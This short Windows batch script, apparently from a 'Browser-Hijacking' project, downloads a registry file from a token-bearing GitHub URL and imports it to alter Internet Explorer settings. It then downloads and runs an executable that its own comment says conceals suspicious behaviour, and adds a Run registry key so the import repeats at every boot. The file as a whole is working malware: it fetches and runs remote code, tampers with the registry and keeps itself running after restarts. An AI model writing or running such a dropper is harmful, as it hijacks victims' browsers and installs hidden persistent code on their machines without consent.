@REM Download IE configuration registry file
curl -o %tmp%\ieconf.reg -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO
@REM Import configuration file into registry
reg import %tmp%\ieconf.reg
@REM Download patcher to make the program run normally without suspicious behavior
curl -o %tmp%\patcher.exe -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
@REM Execute patcher
%tmp%\patcher.exe --unleash "%cd%"
@REM Import registry key every time the computer is booted
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemSearch /t REG_SZ /d "reg import %tmp%\ieconf.reg" /f